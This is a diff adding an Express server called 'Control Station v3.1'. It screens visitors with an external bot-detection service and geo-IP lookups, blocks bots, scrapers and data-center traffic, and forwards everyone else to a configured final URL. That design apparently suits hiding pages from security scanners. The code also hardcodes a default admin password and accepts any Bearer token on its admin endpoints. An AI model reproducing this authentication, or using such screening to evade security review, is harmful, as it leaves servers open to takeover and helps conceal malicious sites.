@@ -1,0 +1,213 @@
+const express = require('express');
+const cors = require('cors');
+const helmet = require('helmet');
+const rateLimit = require('express-rate-limit');
+const fs = require('fs').promises;
+const path = require('path');
+
+const app = express();
+const PORT = process.env.PORT || 3000;
+const CONFIG_PATH = path.join(__dirname, 'config.json');
+const THEMES_PATH = path.join(__dirname, 'themes.json');
+
+// Middleware
+app.use(helmet({
+  contentSecurityPolicy: false,
+}));
+app.use(express.json({ limit: '10mb' }));
+app.use(express.static('public'));
+
+// Dynamic CORS middleware - checks origin against whitelist
+app.use((req, res, next) => {
+  // Allow static files (admin.html, sdk.js) from any origin
+  if (req.path.includes('.') || req.path.startsWith('/admin')) {
+    return next();
+  }
+
+  // For API endpoints, check origin
+  const origin = req.get('origin');
+  const config = req.app.locals.config || {};
+  const allowedDomains = config.allowedDomains || [];
+  const allowAllDomains = config.allowAllDomains || false;
+
+  // Allow if: no origin header (direct request), allowAllDomains is true, or origin is in whitelist
+  if (!origin || allowAllDomains || allowedDomains.some(domain => origin.includes(domain))) {
+    cors({ origin: true, credentials: true })(req, res, next);
+  } else {
+    res.status(403).json({ error: 'ERR-DOMAIN-BLOCKED' });
+  }
+});
+
+// Rate limiting
+const limiter = rateLimit({
+  windowMs: 15 * 60 * 1000,
+  max: 100,
+  message: { error: 'ERR-RATE-LIMIT' }
+});
+app.use('/api/', limiter);
+
+// Load config on startup and cache it
+async function loadConfig() {
+  try {
+    const data = await fs.readFile(CONFIG_PATH, 'utf8');
+    app.locals.config = JSON.parse(data);
+    return app.locals.config;
+  } catch (error) {
+    const defaultConfig = {
+      adminPassword: process.env.ADMIN_PASSWORD || 'cyberpunk2024',
+      finalUrl: 'https://msod.skope.net.au',
+      botDetectionEnabled: true,
+      blockingCriteria: {
+        minScore: 0.7,
+        blockBotUA: true,
+        blockScraperISP: true,
+        blockIPAbuser: true,
+        blockSuspiciousTraffic: false,
+        blockDataCenterASN: true
+      },
+      allowedDomains: [],
+      allowAllDomains: false,
+      allowedCountries: [],
+      blockedCountries: ["North Korea", "Iran", "Russia"],
+      ipBlacklist: ["192.168.1.1"],
+      theme: "default",
+      lastUpdated: new Date().toISOString()
+    };
+    app.locals.config = defaultConfig;
+    await saveConfig(defaultConfig);
+    return defaultConfig;
+  }
+}
+
+async function saveConfig(config) {
+  config.lastUpdated = new Date().toISOString();
+  app.locals.config = config;
+  await fs.writeFile(CONFIG_PATH, JSON.stringify(config, null, 2));
+}
+
+// Middleware to ensure config is loaded
+app.use(async (req, res, next) => {
+  if (!req.app.locals.config) {
+    await loadConfig();
+  }
+  next();
+});
+
+// Public config endpoint
+app.get('/api/config', async (req, res) => {
+  try {
+    const config = req.app.locals.config;
+    // Strip sensitive data
+    res.json({
+      botDetectionEnabled: config.botDetectionEnabled,
+      blockingCriteria: config.blockingCriteria,
+      allowedCountries: config.allowedCountries,
+      blockedCountries: config.blockedCountries,
+      ipBlacklist: config.ipBlacklist,
+      finalUrl: config.finalUrl,
+      theme: config.theme,
+      allowedDomains: config.allowedDomains,
+      allowAllDomains: config.allowAllDomains,
+      lastUpdated: config.lastUpdated
+    });
+  } catch (error) {
+    res.status(500).json({ error: 'ERR-CONFIG-LOAD' });
+  }
+});
+
+// Themes endpoint
+app.get('/api/themes', async (req, res) => {
+  try {
+    const data = await fs.readFile(THEMES_PATH, 'utf8');
+    res.json(JSON.parse(data));
+  } catch (error) {
+    res.status(500).json({ error: 'ERR-THEMES-LOAD' });
+  }
+});
+
+// Bot detection proxy
+app.post('/api/bot-detect', async (req, res) => {
+  try {
+    const { ip, user_agent } = req.body;
+    const response = await fetch('https://bad-defender-production.up.railway.app/api/detect_bot', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ ip, user_agent })
+    });
+    const data = await response.json();
+    res.json(data);
+  } catch (error) {
+    res.status(500).json({ error: 'ERR-BOT-DETECT' });
+  }
+});
+
+// IP lookup
+app.get('/api/geoip/:ip', async (req, res) => {
+  try {
+    const { ip } = req.params;
+    const response = await fetch(`https://ipapi.co/${ip}/json/`);
+    const data = await response.json();
+    res.json({
+      country: data.country_name || 'Unknown',
+      ip: data.ip || ip
+    });
+  } catch (error) {
+    res.status(500).json({ error: 'ERR-GEOIP' });
+  }
+});
+
+// Admin login
+app.post('/api/admin/login', async (req, res) => {
+  const { password } = req.body;
+  const config = req.app.locals.config;
+  
+  if (password === config.adminPassword) {
+    res.json({ success: true, token: 'admin-session-' + Date.now() });
+  } else {
+    res.status(401).json({ error: 'ERR-INVALID-PASS' });
+  }
+});
+
+// Admin config GET
+app.get('/api/admin/config', async (req, res) => {
+  const authHeader = req.headers.authorization;
+  if (!authHeader?.startsWith('Bearer ')) {
+    return res.status(401).json({ error: 'ERR-NO-AUTH' });
+  }
+  
+  res.json(req.app.locals.config);
+});
+
+// Admin config POST
+app.post('/api/admin/config', async (req, res) => {
+  const authHeader = req.headers.authorization;
+  if (!authHeader?.startsWith('Bearer ')) {
+    return res.status(401).json({ error: 'ERR-NO-AUTH' });
+  }
+  
+  try {
+    const newConfig = req.body;
+    const oldConfig = req.app.locals.config;
+    
+    newConfig.adminPassword = newConfig.adminPassword || oldConfig.adminPassword;
+    
+    await saveConfig(newConfig);
+    res.json({ success: true, lastUpdated: newConfig.lastUpdated });
+  } catch (error) {
+    res.status(500).json({ error: 'ERR-CONFIG-SAVE' });
+  }
+});
+
+// Health check
+app.get('/health', (req, res) => {
+  res.json({ status: 'OK', code: 'HEALTHY' });
+});
+
+// Start server
+app.listen(PORT, '0.0.0.0', async () => {
+  await loadConfig();
+  console.log(`🚀 Control Station v3.1 running on port ${PORT}`);
+  console.log(`📊 Admin: http://localhost:${PORT}/admin.html`);
+  console.log(`🎯 SDK: http://localhost:${PORT}/sdk.js`);
+  console.log(`🔒 Domain whitelist active: ${app.locals.config.allowAllDomains ? 'DISABLED' : 'ENABLED'}`);
+});
